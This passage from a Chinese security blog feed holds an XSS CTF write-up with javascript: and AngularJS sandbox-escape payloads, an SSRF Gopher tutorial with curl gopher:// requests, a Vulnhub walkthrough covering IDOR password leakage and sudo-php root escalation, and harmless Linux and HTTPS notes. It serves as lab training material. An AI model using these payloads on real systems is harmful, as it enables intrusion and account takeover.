punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>XSS 伪链接</p><p><code>javascript:alert(/xss/)</code>并不会定向到其他页面，而是在当前页面执行<code>alert(/xss/)</code>。</p><h3 id="windows-location属性"><a href="#windows-location属性" class="headerlink" title="windows.location属性"></a><strong>windows.location</strong>属性</h3><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td>hash</td><td>设置或返回从#开始的URL（锚）</td></tr><tr><td>host</td><td>设置或返回主机名和当前URL的端口号</td></tr><tr><td>hostname</td><td>设置或返回当前URL的主机名</td></tr><tr><td>href</td><td>设置或返回完整的URL</td></tr><tr><td>pathname</td><td>设置或返回当前URL的路径部分</td></tr><tr><td>port</td><td>设置或返回当前URL的端口号</td></tr><tr><td>protocol</td><td>设置或返回当前URL的协议</td></tr><tr><td>search</td><td>设置或返回从?开始的URL（查询部分）</td></tr></tbody></table><p><code>function getQueryVariable()</code>中的<code>window.location.search.substring(1);</code>表示了返回从<code>?</code>开始的URL</p><p><code>jumpUrl</code>为注入点，构造payload：<code>http://127.0.0.1:3000/level3?jumpUrl=javascript:alert();</code></p><p>注入成功。</p><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>审计代码：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">&gt;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token string">'autosubmit'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> autoForm <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'autoForm'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    autoForm<span class="token punctuation">.</span>action <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token string">'action'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token operator">?</span> location<span class="token punctuation">.</span>href <span class="token operator">:</span> <span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token string">'action'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    autoForm<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token parameter">variable</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token keyword">var</span> query <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">var</span> vars <span class="token operator">=</span> query<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"&amp;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>vars<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>               <span class="token keyword">var</span> pair <span class="token operator">=</span> vars<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">if</span><span class="token punctuation">(</span>pair<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> variable<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> pair<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span>       <span class="token punctuation">}</span>       <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>getQueryVariable('autosubmit') !== false</code>其中<code>autosubmit</code>不能为false，需要传入值使其为true；<code>getQueryVariable('action') == false</code>其中<code>action</code>不能为false。参数之间用<code>&amp;</code>连接。</p><p>构造payload：<code>?autosubmit=1&amp;action=javascript:alert(/xss/)</code></p><p>注入成功。</p><h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><p><strong>涉及到模板注入AngularJS沙箱逃逸</strong>。</p><p>常规插入payload<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>及各种绕过方式都无法注入</p><p>查看网页源代码</p><p><code>&lt;script src="https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js"&gt;&lt;/script&gt;</code></p><p>引用了AngularJS框架。</p><p>尝试<code>username={{2*2}}</code></p><p>得到返回值<strong>4</strong>，花括号中的表达式被执行了，意味着服务器允许用户在花括号中传入命令参数，可以实现模板注入攻击。</p><p>根据Wappalyzer判断，AngularJS版本为<code>1.4.6</code></p><p><img src="https://gitee.com/zku4n/picgo/raw/master/img/xssJS.png"></p><p>AngularJS 1.6 版本之前有Angular沙箱，利用沙箱逃逸技术进行XSS攻击。</p><p><strong>AngularJS沙箱逃逸：</strong></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">'a'</span><span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>charAt<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>join<span class="token punctuation">;</span>  <span class="token comment">//'a'.构造函数.原型.charAt</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'x=1}}};alert(1)//'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>通过覆盖原生函数charAt，可以绕过Angular表达式的沙箱且执行<code>alert(1)</code></p><p>因此构造payload：</p><p><code>?username={{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}</code></p><p>注入成功。</p><p>关于AngularJS沙箱逃逸的技术分析：</p><p><a href="https://github.com/rwinch/angularjs-escaping-expression-sandbox">https://github.com/rwinch/angularjs-escaping-expression-sandbox</a></p><p><a href="https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs">https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs</a></p><p><a href="https://xz.aliyun.com/t/4638">https://xz.aliyun.com/t/4638</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;N1BOOK-XSS&quot;&gt;&lt;a href=&quot;#N1BOOK-XSS&quot; class=&quot;headerlink&quot; title=&quot;N1BOOK-XSS&quot;&gt;&lt;/a&gt;N1BOOK-XSS&lt;/h1&gt;&lt;h2 id=&quot;0x01&quot;&gt;&lt;a href=&quot;#0x01&quot; class=&quot;head</summary>
      
    
    
    
    
    <category term="Security" scheme="https://whoiszkuan.github.io/tags/Security/"/>
    
    <category term="Web" scheme="https://whoiszkuan.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>SSRF-Gopher</title>
    <link href="https://whoiszkuan.github.io/2021/10/31/SSRF-Gopher/"/>
    <id>https://whoiszkuan.github.io/2021/10/31/SSRF-Gopher/</id>
    <published>2021-10-31T06:37:46.000Z</published>
    <updated>2021-10-31T12:27:10.256Z</updated>
    
    <content type="html"><![CDATA[<h1 id="What-is-Gopher"><a href="#What-is-Gopher" class="headerlink" title="What is Gopher?"></a>What is Gopher?</h1><h2 id="初识Gopher"><a href="#初识Gopher" class="headerlink" title="初识Gopher"></a>初识Gopher</h2><p>​    在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用<strong>tcp70端口</strong>。</p><p>​    Gopher协议支持发出GET和POST请求：可以先截获GET请求包和POST请求包，再构成符合Gopher协议的请求。Gopher协议是SSRF利用中最强大的协议。</p><p><strong>限制</strong>：</p><table><thead><tr><th align="center">协议</th><th align="center">PHP</th><th align="center">Java</th><th align="center">Curl</th><th align="center">Perl</th><th align="center">ASP.NET</th></tr></thead><tbody><tr><td align="center">Gopher</td><td align="center">–wite-curlwrappers且php版本至少为5.3</td><td align="center">小于JDK1.7</td><td align="center">低版本不支持</td><td align="center">支持</td><td align="center">小于版本3</td></tr></tbody></table><blockquote><p>–wite-curlwrappers:运用curl工具打开url流</p><p>curl使用curl –version查看版本以及支持的协议</p></blockquote><p>Gopher协议格式</p><p><code>URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</code></p><ul><li>Gopher默认端口是70</li><li>如果发起POST请求，回车换行需要使用<code>%0d%0a</code>，如果多个参数，参数之间的&amp;也需要进行URL编码</li></ul><hr><h2 id="Gopher-HTTP"><a href="#Gopher-HTTP" class="headerlink" title="Gopher HTTP"></a>Gopher HTTP</h2><p>Gopher发送HTTP数据步骤：</p><ol><li>构造HTTP数据包</li><li>URL编码、替换回车换行为<code>%0d%0a</code></li><li>发送Gopher协议</li></ol><h3 id="GET型HTTP"><a href="#GET型HTTP" class="headerlink" title="GET型HTTP"></a>GET型HTTP</h3><pre class="line-numbers language-http" data-language="http"><code class="language-http">GET /ssrf/base/get.php?name=zkuan HTTP/1.1Host:192.168.1.111<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>URL编码后使用curl发送HTTP包：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">curl gopher://192.168.1.122/_GET%20/ssrf/base/get.php%3fname=zkuan%20HTTP/1.1%0d%0aHost:192.168.1.111%0d%0a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="POST型HTTP"><a href="#POST型HTTP" class="headerlink" title="POST型HTTP"></a>POST型HTTP</h3><pre class="line-numbers language-http" data-language="http"><code class="language-http">POST /ssrf/base/post.php HTTP/1.1Host:192.168.1.111Content-Type:application/x-www-form-urlencodedContent-Length:11name=zkuan<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>URL编码后使用curl发送HTTP包：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">curl gopher://192.168.1.122/_POST%20/ssrf/base/post.php%20HTTP/1.1%0d%0aHost:192.168.1.111%0d%0aContent-Type:application/x-www-form-urlencoded%0d%0aContent-Length:11%0d%0a%0d%0aname=zkuan%0d%0a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;What-is-Gopher&quot;&gt;&lt;a href=&quot;#What-is-Gopher&quot; class=&quot;headerlink&quot; title=&quot;What is Gopher?&quot;&gt;&lt;/a&gt;What is Gopher?&lt;/h1&gt;&lt;h2 id=&quot;初识Gopher&quot;&gt;&lt;a hr</summary>
      
    
    
    
    
    <category term="Security" scheme="https://whoiszkuan.github.io/tags/Security/"/>
    
    <category term="Web" scheme="https://whoiszkuan.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub Me And My Girlfriend</title>
    <link href="https://whoiszkuan.github.io/2021/10/01/Vulnhub-Me-And-My-Girlfriend/"/>
    <id>https://whoiszkuan.github.io/2021/10/01/Vulnhub-Me-And-My-Girlfriend/</id>
    <published>2021-10-01T06:07:54.000Z</published>
    <updated>2021-10-31T08:44:23.692Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Me-And-My-Girlfriend-1"><a href="#Me-And-My-Girlfriend-1" class="headerlink" title="Me And My Girlfriend:1"></a>Me And My Girlfriend:1</h1><p>渗透准备：</p><ol><li>主机：Kali 2021.2</li><li>靶机：Vmware </li><li>靶机IP段：192.168.158.*</li><li>Http信息头知识</li><li>Linux操作基础</li></ol><h2 id="靶机背景"><a href="#靶机背景" class="headerlink" title="靶机背景"></a>靶机背景</h2><p>难易度：简单</p><p>靶机镜下载地址:<a href="https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/">https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/</a></p><p>背景：This VM tells us that there are a couple of lovers namely Alice and Bob, where the couple was originally very romantic, but since Alice worked at a private company, “Ceban Corp”, something has changed from Alice’s attitude towards Bob like something is “hidden”, And Bob asks for your help to get what Alice is hiding and get full access to the company!</p><p>大致意思就是男主Bob怀疑女主Alice出轨了，让我们潜入Alice公司内部查看Alice的电脑线索。</p><h2 id="开启靶机，扫描目标主机IP段"><a href="#开启靶机，扫描目标主机IP段" class="headerlink" title="开启靶机，扫描目标主机IP段"></a>开启靶机，扫描目标主机IP段</h2><p><code>nmap -sP 192.168.158.0/24</code></p><p>检测出靶机IP为<code>192.168.158.128</code></p><p><img src="/images/mamg1.png"></p><h2 id="扫描靶机信息"><a href="#扫描靶机信息" class="headerlink" title="扫描靶机信息"></a>扫描靶机信息</h2><p>nmap基础用法：<code>-A 版本检测 -O 检测OS版本 -sV 服务探测/版本信息</code></p><p><code>nmap -A -O -sV 192.168.158.128</code></p><p><img src="/images/mamg2.png"></p><p>得出靶机开放了<code>ssh:22</code>和<code>http:80</code>服务</p><h2 id="访问80端口"><a href="#访问80端口" class="headerlink" title="访问80端口"></a>访问80端口</h2><p>访问80端口发现无法正常进入网页</p><p><img src="/images/mamg3.png"></p><p>翻译过来意思是：只能通过本地IP访问</p><p>打开网页源代码看看有没有什么提示：</p><p><img src="/images/mamg4.png"></p><p>提示使用<strong>X-FORWARDED-FOR</strong>访问网页</p><p><code>X-Forwarded-For用来获取最初发起请求的IP</code></p><p>综上所述：我们需要使用X-Forwarded-For伪造一个本地IP为最初发起请求访问靶机80端口</p><h2 id="X-Forwarded-FOR"><a href="#X-Forwarded-FOR" class="headerlink" title="X-Forwarded-FOR"></a>X-Forwarded-FOR</h2><p>已知本地IP地址为<strong>127.0.0.1</strong></p><p>使用X-Forwarded-For Header伪造IP</p><p><img src="/images/xfw.png"></p><p>成功登录</p><p><img src="/images/mamg5.png"></p><p>页面有4个选项，分别为 主页、登录、注册、关于。</p><p>先随便注册一个帐号登录</p><p><img src="/images/mamg6.png"></p><h2 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h2><p>登录进去之后对我们最有用的是Profile选项</p><p>这是一个更改密码的选项</p><p>在网址栏上发现了一点端倪</p><p><code>?</code>后面跟随的是参数<code>page=profile&amp;user_id=12</code>，请求了<code>profile</code>页面，用户id为<code>12</code></p><p>尝试修改Id</p><p><img src="/images/mamg7.png"></p><p>可以看到回显出了其他用户的帐号和密码</p><p>如果获得了帐号和密码就可以尝试登录22端口的ssh服务</p><p>那么密码该如何获得</p><p><code>html中设置输入文本隐藏明文的操作为type="password",在审查代码中修改type类型为type="text",可查看用户输入的密码。</code></p><p><img src="/images/mamg8.png"></p><p><img src="/images/mamg9.png"></p><p>得出用户密码。</p><p>遍历所有用户id后锁定Bob女友Alice的账户密码为<code>alice:4lic3</code></p><h2 id="SSH访问"><a href="#SSH访问" class="headerlink" title="SSH访问"></a>SSH访问</h2><p>得到Alice的账户和密码后，使用ssh访问靶机电脑</p><p><code>ssh alice@192.168.158.128</code></p><p><img src="/images/mamg10.png"></p><h2 id="Flag-1"><a href="#Flag-1" class="headerlink" title="Flag 1"></a>Flag 1</h2><p>列出当前文件夹所有文件，包括隐藏文件</p><p><img src="/images/mamg11.png"></p><p>发现文件夹下有一个隐藏文件夹</p><p><img src="/images/mamg12.png"></p><p><img src="/images/mamg13.png"></p><p>进入后发现有<code>flag1.txt</code>文件</p><p>成功获取flag1</p><p><code>Flag 1 : gfriEND{2f5f21b2af1b8c3e227bcf35544f8f09}</code></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>尝试<code>sudo su</code>无法提权</p><p>查看Alice当前权限</p><p><img src="/images/mamg14.png"></p><p><code>(root)NOPASSWD:/usr/bin/php</code>发现可以不使用密码打开php文件</p><p><a href="https://gtfobins.github.io/">基础提权</a></p><p>尝试回调php提权</p><pre class="line-numbers language-none"><code class="language-none">CMD="/bin/sh"sudo php -r "system('$CMD');"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/images/mamg15.png"></p><p>成功回调root</p><h2 id="Flag-2"><a href="#Flag-2" class="headerlink" title="Flag 2"></a>Flag 2</h2><p>查找flag文件</p><p><img src="/images/mamg16.png"></p><p>进入<code>/root</code>文件夹以后，发现<code>flag2.txt</code>文件</p><p><img src="/images/mamg17.png"></p><p>成功拿下flag2</p><blockquote><p> Flag 2: gfriEND{56fbeef560930e77ff984b644fde66e7}</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Me-And-My-Girlfriend-1&quot;&gt;&lt;a href=&quot;#Me-And-My-Girlfriend-1&quot; class=&quot;headerlink&quot; title=&quot;Me And My Girlfriend:1&quot;&gt;&lt;/a&gt;Me And My Girlfriend</summary>
      
    
    
    
    
    <category term="Security" scheme="https://whoiszkuan.github.io/tags/Security/"/>
    
    <category term="Penetration Testing" scheme="https://whoiszkuan.github.io/tags/Penetration-Testing/"/>
    
  </entry>
  
  <entry>
    <title>Http Agreement</title>
    <link href="https://whoiszkuan.github.io/2021/09/10/Http%20Agreement/"/>
    <id>https://whoiszkuan.github.io/2021/09/10/Http%20Agreement/</id>
    <published>2021-09-10T11:39:28.000Z</published>
    <updated>2021-10-31T08:45:18.556Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>服务器和客户端进行数据交互的一种形式。</p><h2 id="常用请求头信息"><a href="#常用请求头信息" class="headerlink" title="常用请求头信息"></a>常用请求头信息</h2><ul><li>User-Agent：请求载体的身份标识。</li><li>Connection：请求完毕后，是断开连接还是保持连接。</li></ul><h2 id="常用响应头信息"><a href="#常用响应头信息" class="headerlink" title="常用响应头信息"></a>常用响应头信息</h2><ul><li>Content-Type：服务器响应回客户端的数据类型。</li></ul><h2 id="https协议-Hyper-Text-Transfer-Protocol"><a href="#https协议-Hyper-Text-Transfer-Protocol" class="headerlink" title="https协议(Hyper Text Transfer Protocol)"></a>https协议(Hyper Text Transfer Protocol)</h2><ul><li>安全的超文本传输协议</li></ul><h2 id="加密方式"><a href="#加密方式" class="headerlink" title="加密方式"></a>加密方式</h2><ul><li>对称密钥加密</li><li>非对称密钥加密</li><li>证书密钥加密(https)</li></ul><h3 id="对称密钥加密"><a href="#对称密钥加密" class="headerlink" title="对称密钥加密"></a>对称密钥加密</h3><ul><li><p>客户端向服务器发送一条信息，首先客户端会采用已知的算法对信息进行加密，比如MD5或者Base64加密，接收端对加密的信息进行解密的时候需要用到密钥，中间会传递密钥，（加密和解密的密钥是同一个），密钥在传输中间是被加密。</p><p><strong>有潜在的危险，一旦被窃听，或者信息被挟持，就有可能破解密钥，而破解其中的信息。因此“共享密钥加密”这种方式存在安全隐患。</strong></p></li></ul><p><img src="/images/https-key1.png"></p><h3 id="非对称密钥加密"><a href="#非对称密钥加密" class="headerlink" title="非对称密钥加密"></a>非对称密钥加密</h3><ul><li><p>“非对称加密”使用的时候有两把锁，一把叫做“私有密钥”，一把是“公开密钥”，使用非对象加密的加密方式的时候，服务器首先告诉客户端按照自己给定的公开密钥进行加密处理，客户端按照公开密钥加密以后，服务器接受到信息再通过自己的私有密钥进行解密。</p><p><strong>这样做的好处就是解密的钥匙根本就不会进行传输，因此也就避免了被挟持的风险。就算公开密钥被窃听者拿到了，它也很难进行解密，因为解密过程是对离散对数求值，这可不是轻而易举就能做到的事。</strong></p><p><strong>缺点：</strong></p><ul><li>如何保证接收端向发送端发出公开秘钥的时候，发送端确保收到的是预先要发送的，而不会被挟持。只要是发送密钥，就有可能有被挟持的风险。</li><li>非对称加密的方式效率比较低，它处理起来更为复杂，通信过程中使用就有一定的效率问题而影响通信速度</li></ul><p><img src="/images/https-key2.png"></p></li></ul><h3 id="证书密钥加密"><a href="#证书密钥加密" class="headerlink" title="证书密钥加密"></a>证书密钥加密</h3><p>数字证书认证机构是客户端与服务器都可信赖的第三方机构。</p><p>传播过程：</p><ul><li>服务器的开发者携带公开密钥，向数字证书认证机构提出公开密钥的申请，数字证书认证机构在认清申请者的身份，审核通过以后，会对开发者申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将密钥放在证书里面，绑定在一起</li><li>服务器将这份数字证书发送给客户端，因为客户端也认可证书机构，客户端可以通过数字证书中的数字签名来验证公钥的真伪，来确保服务器传过来的公开密钥是真实的。一般情况下，证书的数字签名是很难被伪造的，这取决于认证机构的公信力。一旦确认信息无误之后，客户端就会通过公钥对报文进行加密发送，服务器接收到以后用自己的私钥进行解密。</li></ul><p><img src="/images/https-key3.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h2&gt;&lt;p&gt;服务器和客户端进行数据交互的一种形式。&lt;/p&gt;
&lt;h2 id=&quot;常用请求头信息&quot;&gt;&lt;a href=&quot;#常用请求头信息&quot; class=&quot;hea</summary>
      
    
    
    
    <category term="Web安全" scheme="https://whoiszkuan.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Security" scheme="https://whoiszkuan.github.io/tags/Security/"/>
    
    <category term="Web" scheme="https://whoiszkuan.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>gTile Linux split screen</title>
    <link href="https://whoiszkuan.github.io/2021/08/14/gTile%20Linux%20split%20screen/"/>
    <id>https://whoiszkuan.github.io/2021/08/14/gTile%20Linux%20split%20screen/</id>
    <published>2021-08-14T07:26:29.000Z</published>
    <updated>2021-10-31T08:45:27.636Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><strong>这是Gnome-Shell的一个扩展插件，由于Gnome桌面的平铺方案最多只能两个窗口，对于大屏幕显示器来说是不够用的，而gTile可以解决这个问题。</strong></p><p><strong>gTile拥有多个内置平铺方案，可平铺多个窗口，增加工作效率。可自行配置快捷键唤醒gTile进行平铺</strong></p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="Gnome-Extensions-Install"><a href="#Gnome-Extensions-Install" class="headerlink" title="Gnome Extensions Install"></a>Gnome Extensions Install</h2><p><strong>先安装Gnome-Shell再安装扩展</strong> <a href="https://extensions.gnome.org/extension/28/gtile/">gTile-Gnome-Shell</a><br><img src="/images/gtile-1.png"></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>打开扩展方式：Gnome Tweak Tools(优化) –&gt; Extensions(扩展) –&gt; Gtile(点击开启按钮)</p><p>点击设置按钮进入配置界面，点击(Accelerators)选项可配置快捷键，唤醒gTile的快捷键为<code>Super+Enter</code>。更多快捷键请自行探索。<br><img src="/images/gtile-2.png"></p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><ol><li><code>Super+Enter</code>唤醒gTile <img src="/images/gtile-3.png"></li><li>按下键盘数字键0～9使用预设方案<code>Super+Enter+3</code> <img src="/images/gtile-4.png"></li></ol><p>还有更多预设方案可多个窗口平铺<br><img src="/images/gtile-5.png"><br><img src="/images/gtile-6.png"><br><img src="/images/gtile-7.png"></p><p>GitHub gTile:<a href="https://github.com/gtile/gtile">Gtile项目地址</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;这是Gnome-Shell的一个扩展插件，由于Gnome桌面的平铺方案最多只能两个窗口，对于大屏幕显示器来说是不够用的，而g</summary>
      
    
    
    
    <category term="Linux" scheme="https://whoiszkuan.github.io/categories/Linux/"/>
    
    <category term="配置" scheme="https://whoiszkuan.github.io/categories/Linux/%E9%85%8D%E7%BD%AE/"/>
    
    
    <category term="Linux" scheme="https://whoiszkuan.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>About My LInux</title>
    <link href="https://whoiszkuan.github.io/2021/08/12/About%20My%20LInux/"/>
    <id>https://whoiszkuan.github.io/2021/08/12/About%20My%20LInux/</id>
    <published>2021-08-12T04:02:39.000Z</published>
    <updated>2021-10-31T08:29:32.080Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简言"><a href="#简言" class="headerlink" title="简言"></a>简言</h1><p>由于平时比较喜欢折腾Linux，经常会把系统反复安装，许多原先配置好的东西都忘记了,所以打算写一篇来记录一下自己平时配置的文件操作。<br><strong>注：本人使用的Linux系统为Kali Linux</strong></p><h2 id="ranger"><a href="#ranger" class="headerlink" title="ranger"></a>ranger</h2><p>ranger是一款命令行文件资源管理器，提供多级视图，方便操作</p><blockquote><p>sudo apt install ranger</p></blockquote><p>启动命令：<code>ranger</code><br><img src="/images/ranger.png"></p><h2 id="proxychains"><a href="#proxychains" class="headerlink" title="proxychains"></a>proxychains</h2><p>proxychains是一款命令行代理工具，可将当前应用的TCP转发至代理，非全局代理。<br>目前支持Tor,HTTP,Socks代理。</p><blockquote><p>git clone <a href="https://github.com/rofl0r/proxychains-ng">https://github.com/rofl0r/proxychains-ng</a><br>cd proxychains-ng<br>./configure<br>sudo make &amp;&amp; make install</p></blockquote><p>代理配置文件位置：<code>/etc/proxychains.conf</code><br>启动命令：<code>proxychains4 &lt;启动应用&gt;</code></p><h2 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h2><p>相比Linux下的程序员都知道Vim，由于自己平时比较懒，不想学Vim的语法，所以Vim并没有自己配置，而是使用了<code>Vim-Plus</code>，即开即用。</p><blockquote><p>git clone <a href="https://github.com/chxuan/vimplus.git">https://github.com/chxuan/vimplus.git</a> ~/.vimplus<br>cd ~/.vimplus<br>./install.sh</p></blockquote><p><img src="/images/vim.png"><br>Vim的主题被我注释掉了，使用的主题是Terminal自带的Kali-Dark主题配色。</p><h2 id="music-dl"><a href="#music-dl" class="headerlink" title="music-dl"></a>music-dl</h2><p>music-dl是一款基于Python3的命令行网络音乐聚合搜索下载工具。</p><p>使用pip3安装，前提需要安装pip3：<code>sudo apt install pip3</code><br>安装music-dl:<code>sudo pip3 install pymusic-dl</code></p><p><img src="/images/music-dl.png"></p><blockquote><p>$ music-dl –help<br>Usage: music-dl [OPTIONS]</p><p> Search and download music from netease, qq, kugou, baidu and xiami.<br>  Example: music-dl -k “周杰伦”</p><p>Options:<br>  –version             Show the version and exit.<br>  -k, –keyword TEXT    搜索关键字，歌名和歌手同时输入可以提高匹配（如 空帆船 朴树）<br>  -u, –url TEXT        通过指定的歌曲URL下载音乐<br>  -p, –playlist TEXT   通过指定的歌单URL下载音乐<br>  -s, –source TEXT     Supported music source: qq netease kugou baidu<br>  -n, –number INTEGER  Number of search results<br>  -o, –outdir TEXT     Output directory<br>  -x, –proxy TEXT      Proxy (e.g. <a href="http://127.0.0.1:1087/">http://127.0.0.1:1087</a>)<br>  -v, –verbose         Verbose mode<br>  –lyrics              同时下载歌词<br>  –cover               同时下载封面<br>  –nomerge             不对搜索结果列表排序和去重<br>  –help                Show this message and exit.</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简言&quot;&gt;&lt;a href=&quot;#简言&quot; class=&quot;headerlink&quot; title=&quot;简言&quot;&gt;&lt;/a&gt;简言&lt;/h1&gt;&lt;p&gt;由于平时比较喜欢折腾Linux，经常会把系统反复安装，许多原先配置好的东西都忘记了,所以打算写一篇来记录一下自己平时配置的文件操作。&lt;br&gt;</summary>
      
    
    
    
    <category term="Linux" scheme="https://whoiszkuan.github.io/categories/Linux/"/>
    
    <category term="配置" scheme="https://whoiszkuan.github.io/categories/Linux/%E9%85%8D%E7%BD%AE/"/>
    
    
    <category term="Linux" scheme="https://whoiszkuan.github.io/tags/Linux/"/>
    
  </entry>
  
</feed>
